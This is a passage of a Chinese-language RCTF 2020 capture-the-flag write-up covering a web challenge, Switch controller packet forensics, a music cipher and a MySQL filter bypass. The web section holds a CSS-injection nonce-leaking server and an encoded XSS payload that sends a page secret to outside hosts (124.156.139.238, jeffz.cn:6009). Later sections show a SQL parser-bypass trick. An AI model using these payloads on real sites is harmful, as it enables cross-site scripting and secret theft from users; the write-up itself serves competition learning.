&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`script[nonce^="<span class="subst">$&#123;cssesc(knownValue+char)&#125;</span>"] ~ a &#123; background: url("<span class="subst">$&#123;LEAK_ORIGIN&#125;</span>/leak/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;urlencode(knownValue+char)&#125;</span>")&#125;`</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line"></span><br><span class="line">    res.send(ret);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/leak/:session/:value'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, value &#125; = req.params;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;session&#125;</span>] Leaked value: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    SESSIONS[session].resolves[value.length](value);</span><br><span class="line">    res.status(<span class="number">204</span>).send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/generate'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> length = req.query.len || <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">const</span> session = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        res.write(<span class="string">`&lt;style&gt;@import '<span class="subst">$&#123;POLLING_ORIGIN&#125;</span>/polling/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;i&#125;</span>';&lt;/style&gt;\n`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    key: fs.readFileSync(<span class="string">'/etc/ssl/private/private.key'</span>),</span><br><span class="line">    cert:  fs.readFileSync(<span class="string">'/etc/ssl/certs/full_chain.pem'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line">spdy.createServer(options, app).listen(PORT, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;PORT&#125;</span>!`</span>))</span><br></pre></td></tr></table></figure>

<p>运行之后访问 <code>https://example.com:3000/generate</code> 生成xss代码</p>
<p>然后x到网页中，将url修改并反馈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;s example:3000;style-src * &#39;unsafe-inline&#39;;&#x2F;?action&#x3D;post&amp;id&#x3D;a4d458c79bfe6f37997620dcb9fa507a</span><br></pre></td></tr></table></figure>

<p>同样也要md5截断比较</p>
<p>（这里不知道为什么复现的时候md5截断一直没成功，但是我们可以本地测试，虽然返回不了flag</p>
<p>拿到nonce之后查看网页的js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noop</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</span><br><span class="line">        mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> nodes = mutation.addedNodes;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> node = nodes[i];</span><br><span class="line">                <span class="keyword">if</span> (node.src != <span class="literal">undefined</span> &amp;&amp; node.src != <span class="string">""</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/www.google\.com\/*$/</span>.test(node.src)) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        node.parentNode.removeChild(node);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.srcdoc != <span class="literal">undefined</span> &amp;&amp; node.srcdoc != <span class="string">""</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/[^a-zA-z0-9:/]/</span>.test(node.srcdoc)) &#123;</span><br><span class="line">                        node.parentNode.removeChild(node);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    observer.observe(<span class="built_in">document</span>, &#123;</span><br><span class="line">        subtree: <span class="literal">true</span>,</span><br><span class="line">        childList: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">window</span>.open = <span class="function"><span class="params">()</span> =&gt;</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">const</span> oldCreateElement = Document.prototype.createElement</span><br><span class="line">    Document.prototype.createElement = <span class="function">(<span class="params">a, ...args</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a !== <span class="string">'iframe'</span> &amp;&amp; a !== <span class="string">'frame'</span>)</span><br><span class="line">            <span class="keyword">return</span> oldCreateElement.apply(<span class="built_in">document</span>, [a, ...args])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    Document.prototype.createElementNS = noop</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="built_in">window</span>.uneval = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="built_in">Function</span>.prototype.toString = noop</span><br><span class="line"><span class="built_in">Function</span>.prototype.toSource = noop</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'load'</span>, (e) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'fucked'</span>)</span><br><span class="line">        e.target.contentWindow.Function.prototype.toString = noop</span><br><span class="line">        e.target.contentWindow.Function.prototype.toSource = noop</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br><span class="line">[<span class="string">'Document'</span>, <span class="string">'Element'</span>].forEach(<span class="function"><span class="params">documentKey</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.keys(<span class="built_in">window</span>[documentKey].prototype).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>[documentKey].prototype[key] <span class="keyword">instanceof</span> <span class="built_in">Function</span>) &#123;</span><br><span class="line">                <span class="built_in">window</span>[documentKey].prototype[key] = noop</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>可以看到这里过滤了很多东西</p>
<ol>
<li>过滤了正则匹配<code>src</code> = <code>/^https:\/\/www.google\.com\/*$/</code> 的node节点</li>
<li>过滤了正则匹配<code>srcdoc</code> = <code>/[^a-zA-z0-9:/]/</code> 的node节点</li>
<li>禁止使用 <code>createElement</code> 创建 <code>iframe</code> 和 <code>frame</code> 元素</li>
<li>废了 <code>window.uneval</code> 、<code>toString</code> 、<code>toSource</code></li>
<li><code>Document</code> 、<code>Element</code> 下的 <code>Function</code> 类型的 <code>key</code> 都被艹了</li>
</ol>
<p>正则匹配，我们可以通过覆写 <code>RegExp.prototype.test</code> 来绕过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RegExp</span>.prototype.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>不能用 <code>createElement</code> 创建 <code>iframe</code> 元素，但是我们可以通过 <code>innerHTML</code> 直接写入</p>
<p>payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">1f73cd3daaa1a2279bedeb7c5299bae1</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">RegExp</span>.prototype.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a=<span class="string">"&lt;ifra"</span>.concat(<span class="string">"me sr"</span>,<span class="string">"cdoc='\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x34\x2e\x31\x35\x36\x2e\x31\x33\x39\x2e\x32\x33\x38\x2f\x66\x6c\x61\x67\x2e\x70\x68\x70\x3f\x66\x3d\x31\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x20\x6e\x6f\x6e\x63\x65\x3d\x31\x66\x37\x33\x63\x64\x33\x64\x61\x61\x61\x31\x61\x32\x32\x37\x39\x62\x65\x64\x65\x62\x37\x63\x35\x32\x39\x39\x62\x61\x65\x31\x3e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x6a\x65\x66\x66\x7a\x2e\x63\x6e\x3a\x36\x30\x30\x39\x2f\x22\x2b\x62\x74\x6f\x61\x28\x67\x65\x74\x5f\x73\x65\x63\x72\x65\x74\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e'&gt;"</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.innerHTML=a;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中编码的内容为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://124.156.139.238/flag.php?f=1"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">1f73cd3daaa1a2279bedeb7c5299bae1</span>&gt;</span><span class="actionscript">location.href=<span class="string">"http://jeffz.cn:6009/"</span>+btoa(get_secret)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.156.139.238&#x2F;;frame-src *;&#x2F;?action&#x3D;post&amp;id&#x3D;4364f67e1ca98b009f17d70631e569ae</span><br></pre></td></tr></table></figure>

<p>本地获得返回的结果</p>
<p>base64解码后成功获得函数内容</p>
<p><img src="https://i.loli.net/2020/06/03/E5RVrU64bO8nS1c.png" alt="image.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Switch-PRO-Controller"><a href="#Switch-PRO-Controller" class="headerlink" title="Switch PRO Controller"></a>Switch PRO Controller</h3><blockquote>
<p> 这题张佬@SJoshua直接拿出Pro手柄分析出了手柄的协议，找到按下按键的相对时间出的flag</p>
<p>但是如果没有Pro手柄怎么做出这道题？于是我决定等官方wp出来自己复现一下</p>
</blockquote>
<p>出题人wp：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xpdHRsZWZpc2hlcjYxOS9NeUNURkNoYWxsZW5nZXMvYmxvYi9tYXN0ZXIvQ1RGQ2hhbGxlbmdlU3dpdGNoL3NvbHV0aW9uX3poY24ubWQ=">https://github.com/Littlefisher619/MyCTFChallenges/blob/master/CTFChallengeSwitch/solution_zhcn.md<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>通信协议</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwYWNlbWVvd3gyL1JlbW90ZVN3aXRjaENvbnRyb2xsZXIvYmxvYi9kZXYvc3BsYXRvb24tYm90L3NyYy9jb250cm9sbGVyLnRz">https://github.com/spacemeowx2/RemoteSwitchController/blob/dev/splatoon-bot/src/controller.ts<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rla3VOdWtlbS9OaW50ZW5kb19Td2l0Y2hfUmV2ZXJzZV9FbmdpbmVlcmluZy9ibG9iL21hc3Rlci9ibHVldG9vdGhfaGlkX25vdGVzLm1k">https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering/blob/master/bluetooth_hid_notes.md<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RvYWRLaW5nL3N3aXRjaC1wcm8teC9ibG9iL21hc3Rlci9zd2l0Y2gtcHJvLXgvUHJvQ29udHJvbGxlckRldmljZS5jcHA=">https://github.com/ToadKing/switch-pro-x/blob/master/switch-pro-x/ProControllerDevice.cpp<i class="fa fa-external-link-alt"></i></span></p>
<p>这里我们需要知道按下确认键，也就是A键的相对时间，查阅上述源码得知</p>
<p><img src="https://i.loli.net/2020/06/02/bskoUEFrPT4W6DR.png" alt="image.png"></p>
<p>由于是USB包，所以这里A键的掩码为<code>0x00000800</code></p>
<p><img src="https://i.loli.net/2020/06/02/Ghjsk9NM3PntWmB.png" alt="image.png"></p>
<p>然后控制器数据是 <code>0x30</code> 开头的</p>
<p>也就是 <code>30:**:**:*8:**:...</code></p>
<p>然后我们开始处理pcapng包，为了方便编写脚本处理，将其导出为json</p>
<p><img src="https://i.loli.net/2020/06/02/qrGRpxSYIlWdcB8.png" alt="image.png"></p>
<p>从中抽取一个有传输数据的帧来进行分析</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"_index"</span>: <span class="string">"packets-2020-03-19"</span>,</span><br><span class="line">    <span class="attr">"_type"</span>: <span class="string">"pcap_file"</span>,</span><br><span class="line">    <span class="attr">"_score"</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"_source"</span>: &#123;</span><br><span class="line">        <span class="attr">"layers"</span>: &#123;</span><br><span class="line">            <span class="attr">"frame"</span>: &#123;</span><br><span class="line">                <span class="attr">"frame.interface_id"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"frame.interface_id_tree"</span>: &#123;</span><br><span class="line">                    <span class="attr">"frame.interface_name"</span>: <span class="string">"wireshark_extcap2904"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"frame.encap_type"</span>: <span class="string">"152"</span>,</span><br><span class="line">                <span class="attr">"frame.time"</span>: <span class="string">"Mar 19, 2020 13:48:22.479099000 中国标准时间"</span>,</span><br><span class="line">                <span class="attr">"frame.offset_shift"</span>: <span class="string">"0.000000000"</span>,</span><br><span class="line">                <span class="attr">"frame.time_epoch"</span>: <span class="string">"1584596902.479099000"</span>,</span><br><span class="line">                <span class="attr">"frame.time_delta"</span>: <span class="string">"0.015945000"</span>,</span><br><span class="line">                <span class="attr">"frame.time_delta_displayed"</span>: <span class="string">"0.015945000"</span>,</span><br><span class="line">                <span class="attr">"frame.time_relative"</span>: <span class="string">"5.008677000"</span>,</span><br><span class="line">                <span class="attr">"frame.number"</span>: <span class="string">"289"</span>,</span><br><span class="line">                <span class="attr">"frame.len"</span>: <span class="string">"91"</span>,</span><br><span class="line">                <span class="attr">"frame.cap_len"</span>: <span class="string">"91"</span>,</span><br><span class="line">                <span class="attr">"frame.marked"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"frame.ignored"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"frame.protocols"</span>: <span class="string">"usb"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"usb"</span>: &#123;</span><br><span class="line">                <span class="attr">"usb.src"</span>: <span class="string">"1.44.1"</span>,</span><br><span class="line">                <span class="attr">"usb.addr"</span>: <span class="string">"1.44.1"</span>,</span><br><span class="line">                <span class="attr">"usb.dst"</span>: <span class="string">"host"</span>,</span><br><span class="line">                <span class="attr">"usb.addr"</span>: <span class="string">"host"</span>,</span><br><span class="line">                <span class="attr">"usb.usbpcap_header_len"</span>: <span class="string">"27"</span>,</span><br><span class="line">                <span class="attr">"usb.irp_id"</span>: <span class="string">"0xffff8d8e004b0420"</span>,</span><br><span class="line">                <span class="attr">"usb.usbd_status"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"usb.function"</span>: <span class="string">"9"</span>,</span><br><span class="line">                <span class="attr">"usb.irp_info"</span>: <span class="string">"0x00000001"</span>,</span><br><span class="line">                <span class="attr">"usb.irp_info_tree"</span>: &#123;</span><br><span class="line">                    <span class="attr">"usb.irp_info.reserved"</span>: <span class="string">"0x00000000"</span>,</span><br><span class="line">                    <span class="attr">"usb.irp_info.direction"</span>: <span class="string">"0x00000001"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"usb.bus_id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"usb.device_address"</span>: <span class="string">"44"</span>,</span><br><span class="line">                <span class="attr">"usb.endpoint_address"</span>: <span class="string">"0x00000081"</span>,</span><br><span class="line">                <span class="attr">"usb.endpoint_address_tree"</span>: &#123;</span><br><span class="line">                    <span class="attr">"usb.endpoint_address.direction"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"usb.endpoint_address.number"</span>: <span class="string">"1"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"usb.transfer_type"</span>: <span class="string">"0x00000001"</span>,</span><br><span class="line">                <span class="attr">"usb.data_len"</span>: <span class="string">"64"</span>,</span><br><span class="line">                <span class="attr">"usb.request_in"</span>: <span class="string">"286"</span>,</span><br><span class="line">                <span class="attr">"usb.time"</span>: <span class="string">"0.023867000"</span>,</span><br><span class="line">                <span class="attr">"usb.bInterfaceClass"</span>: <span class="string">"3"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"usb.capdata"</span>: <span class="string">"30:fa:91:00:80:00:11:88:77:cb:97:71:0c:06:04:45:fd:5a:0f:d8:ff:d0:ff:cd:ff:0c:04:48:fd:5d:0f:d5:ff:d0:ff:d1:ff:0d:04:47:fd:59:0f:d3:ff:cd:ff:d5:ff:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只需要以上的几个数据</p>
<ul>
<li>_source<ul>
<li>layers<ul>
<li>frame<ul>
<li><strong>frame.time_relative</strong> （相对时间）</li>
</ul>
</li>
<li><strong>usb.capdata</strong> （传输的数据）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DELTA = <span class="number">6</span></span><br><span class="line"><span class="comment"># 与视频中按下第一个A键</span></span><br><span class="line">JSONFILE = <span class="string">'data.json'</span></span><br><span class="line">VEDIOFILE = <span class="string">'screenrecord.mp4'</span></span><br><span class="line">FRAMES_FOLDER = <span class="string">'frames'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FRAMES_FOLDER):</span><br><span class="line">    os.makedirs(FRAMES_FOLDER)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取按下A键时间</span></span><br><span class="line"><span class="keyword">with</span> open(JSONFILE, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    packets = json.load(f)</span><br><span class="line">pressed = <span class="literal">False</span></span><br><span class="line">frames_time = []</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        layers = frame[<span class="string">'_source'</span>][<span class="string">'layers'</span>]</span><br><span class="line">        time = float(layers[<span class="string">'frame'</span>][<span class="string">'frame.time_relative'</span>])</span><br><span class="line">        capdata = bytearray.fromhex(layers[<span class="string">'usb.capdata'</span>].replace(<span class="string">':'</span>, <span class="string">' '</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> capdata[<span class="number">0</span>] == <span class="number">0x30</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pressed <span class="keyword">and</span> capdata[<span class="number">3</span>] &amp; <span class="number">0x8</span>:</span><br><span class="line">            pressed = <span class="literal">True</span></span><br><span class="line">            press_time = (time+DELTA)*<span class="number">1000</span></span><br><span class="line">            frames_time.append(press_time)  <span class="comment"># 开始按下A键的时间</span></span><br><span class="line">            print(<span class="string">f'<span class="subst">&#123;time&#125;</span> : press'</span>)</span><br><span class="line">        <span class="keyword">elif</span> pressed <span class="keyword">and</span> <span class="keyword">not</span> capdata[<span class="number">3</span>] &amp; <span class="number">0x8</span>:</span><br><span class="line">            pressed = <span class="literal">False</span></span><br><span class="line">            release_time = (time+DELTA)*<span class="number">1000</span></span><br><span class="line">            <span class="comment"># 设置为按下A键的时间的中间值</span></span><br><span class="line">            frames_time[<span class="number">-1</span>] = int((frames_time[<span class="number">-1</span>]+release_time)/<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">f'<span class="subst">&#123;time&#125;</span> : release\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取对应帧</span></span><br><span class="line">cap = cv2.VideoCapture(VEDIOFILE)</span><br><span class="line"><span class="keyword">for</span> i, time <span class="keyword">in</span> enumerate(frames_time):</span><br><span class="line">    cap.set(cv2.CAP_PROP_POS_MSEC, time)</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    idx = str(i).zfill(<span class="number">3</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">f'<span class="subst">&#123;FRAMES_FOLDER&#125;</span>/<span class="subst">&#123;idx&#125;</span>.jpg'</span>, frame)</span><br></pre></td></tr></table></figure>

<p>查看图片得到flag</p>
<blockquote>
<p>RCTF{5witch-1s-4m4z1ng-m8dw65}</p>
<p>按照题目要求将<code>-</code>换成<code>_</code>得到</p>
<p>RCTF{5witch_1s_4m4z1ng_m8dw65}</p>
</blockquote>
<h3 id="Listen"><a href="#Listen" class="headerlink" title="Listen"></a>Listen</h3><p>提示1804</p>
<p>参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2lyZWxlc3MvMTY3MDkzLmh0bWw=">https://www.freebuf.com/articles/wireless/167093.html<i class="fa fa-external-link-alt"></i></span> 的密码表</p>
<p><img src="https://image.3001.net/images/20180331/15224839412949.png!small" alt="img"></p>
<p>然后找个<code>音乐人</code>用耳朵扒谱</p>
<p>得到以下谱子</p>
<blockquote>
<p>播放音频获取音频文件中的琴键代表的音符（C调，1是do，8是高八度的do，9是re，a是mi，b是fa，c是sol）</p>
<p><code>45678975cba984642576576756abc9a98765a9a89456576879cba98798a9576879a98765798a943322a9876576756</code></p>
</blockquote>
<p>结合<code>tips.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The flag format is  &quot;RCTF&#123;xxxxxxxxxx&#125;&quot;</span><br><span class="line">PS：All letters are lowercase</span><br></pre></td></tr></table></figure>

<p>对着密码表解出flag</p>
<p><code>RCTF{ufindthemusicsecret}</code></p>
<h3 id="mysql-interface"><a href="#mysql-interface" class="headerlink" title="mysql_interface"></a>mysql_interface</h3><p><span class="exturl" data-url="aHR0cHM6Ly9teXNxbC1pbnRlcmZhY2UucmN0ZjIwMjAucm9pcy5pbw==">https://mysql-interface.rctf2020.rois.io<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"github.com/pingcap/parser"</span>                     <span class="comment">// v3.1.2-0.20200507065358-a5eade012146+incompatible</span></span><br><span class="line">    _ <span class="string">"github.com/pingcap/tidb/types/parser_driver"</span> <span class="comment">// v1.1.0-beta.0.20200520024639-0414aa53c912</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isForbidden = [<span class="number">256</span>]<span class="keyword">bool</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> forbidden = <span class="string">"\x00\t\n\v\f\r`~!@#$%^&amp;*()_=[]&#123;&#125;\\|:;'\"/?&lt;&gt;,\xa0"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(forbidden); i++ &#123;</span><br><span class="line">        isForbidden[forbidden[i]] = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">allow</span><span class="params">(payload <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &lt; <span class="number">3</span> || <span class="built_in">len</span>(payload) &gt; <span class="number">128</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(payload); i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> isForbidden[payload[i]] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, _, err := parser.New().Parse(payload, <span class="string">""</span>, <span class="string">""</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do query...</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>源码是<code>golang</code></p>
<p>分析题意</p>
<blockquote>
<p>不允许使用 “\x00\t\n\v\f\r`~!@#$%^&amp;*()_=[]{}\|:;’&quot;/?&lt;&gt;,\xa0” 这些字符，进行select flag from flag</p>
<p>还要绕过paser，使parser报错，但是又可以执行</p>
</blockquote>
<p>简单看了下paser的源码，发现它使用关键字解析的，我们可以构造一些它不存在的关键字让它报错，但是又要mysql能执行的语句，然后就想到了注释</p>
<p>显然</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select flag from flag --\x20</span><br></pre></td></tr></table></figure>

<p>这个注释符是会被paser解析到的</p>
<p>但是我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select flag from flag --\x04</span><br></pre></td></tr></table></figure>

<p>(这里<code>\x04</code>还可以用别的，比如<code>\x01</code>，<code>\x02</code>都可以)</p>
<p>(别的队用的 <code>select flag from .flag</code> 也可以绕过，还有大佬用<code>handler</code>做出来了)</p>
<p>从而使paser解析错误，又让mysql可以执行</p>
<p>然后将队友<code>@Tyaoo</code>的脚本稍微改改就出flag了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cartesian_product</span><span class="params">()</span>:</span></span><br><span class="line">    chars = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">    <span class="keyword">return</span> [[x,y,z]<span class="keyword">for</span> x <span class="keyword">in</span> chars <span class="keyword">for</span> y <span class="keyword">in</span> chars <span class="keyword">for</span> z  <span class="keyword">in</span> chars]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    cartesian = cartesian_product()</span><br><span class="line">    url = <span class="string">'https://mysql-interface.rctf2020.rois.io'</span></span><br><span class="line">    res = rq.get(url)</span><br><span class="line">    hash = re.findall(<span class="string">r'\) = ([0-9a-f]+?)&lt;/div&gt;'</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">f"[+] hash: <span class="subst">&#123;hash&#125;</span>"</span>)</span><br><span class="line"> </span><br><span class="line">    prefix = <span class="string">'RCTF2020_mysql_interface_'</span></span><br><span class="line">    codes = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cartesian:</span><br><span class="line">        i = <span class="string">''</span>.join(i)</span><br><span class="line">        plain = <span class="string">f"<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;i&#125;</span>"</span></span><br><span class="line">        <span 